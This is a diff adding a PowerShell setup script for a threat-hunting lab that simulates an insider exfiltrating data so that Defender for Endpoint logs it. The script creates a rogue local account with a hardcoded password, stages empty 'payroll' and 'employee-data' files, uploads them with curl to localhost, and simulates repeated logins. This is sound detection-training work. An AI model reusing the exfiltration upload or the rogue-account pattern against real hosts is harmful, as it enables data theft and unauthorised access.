@@ -1,0 +1,49 @@
+# -------------------------------
+# Threat Hunting Lab Setup Script
+# Scenario: Insider Threat – Data Exfiltration
+# Author: Kevin Brown
+# -------------------------------
+
+# 1. Create a rogue user account
+$Username = "baduser"
+$Password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
+New-LocalUser -Name $Username -Password $Password -FullName "Malicious Insider" -Description "Rogue test account for threat simulation"
+Add-LocalGroupMember -Group "Users" -Member $Username
+
+# 2. Switch to the user's Documents directory and simulate sensitive file creation
+$SensitiveFolders = @("C:\Users\$Username\Documents\PII", "C:\Users\$Username\Documents\Finance")
+foreach ($folder in $SensitiveFolders) {
+    New-Item -Path $folder -ItemType Directory -Force
+    New-Item -Path "$folder\payroll-2025.xlsx" -ItemType File
+    New-Item -Path "$folder\employee-data.txt" -ItemType File
+}
+
+# 3. Simulate the rogue user accessing and copying files
+$TargetDir = "C:\Users\$Username\Desktop\exfil"
+New-Item -ItemType Directory -Path $TargetDir -Force
+
+Copy-Item -Path "C:\Users\$Username\Documents\PII\*" -Destination $TargetDir
+Copy-Item -Path "C:\Users\$Username\Documents\Finance\*" -Destination $TargetDir
+
+# 4. Download and use curl (if not already installed)
+if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
+    Invoke-WebRequest -Uri "https://curl.se/windows/dl-7.88.1_2/curl-7.88.1_2-win64-mingw.zip" -OutFile "$env:TEMP\curl.zip"
+    Expand-Archive -Path "$env:TEMP\curl.zip" -DestinationPath "$env:TEMP\curl"
+    $env:Path += ";$env:TEMP\curl\curl-7.88.1_2-win64-mingw\bin"
+}
+
+# 5. Simulate exfiltration using curl (localhost or dummy address)
+$files = Get-ChildItem -Path $TargetDir
+foreach ($file in $files) {
+    Start-Process -FilePath "curl.exe" -ArgumentList "-T `"$($file.FullName)`" http://127.0.0.1:8080/upload" -NoNewWindow
+    Start-Sleep -Seconds 2
+}
+
+# 6. Simulate multiple logins (will appear as multiple logon events)
+for ($i = 0; $i -lt 5; $i++) {
+    Start-Process "powershell.exe" -Credential (New-Object System.Management.Automation.PSCredential($Username, $Password)) -ArgumentList "-Command `"Write-Output 'Login Simulation'`""
+    Start-Sleep -Seconds 3
+}
+
+# 7. Clean-up marker (not executed)
+Write-Host "`nThreat simulation complete. Logs should now be visible in MDE (FileEvents, ProcessEvents, NetworkEvents, LogonEvents)." -ForegroundColor Green
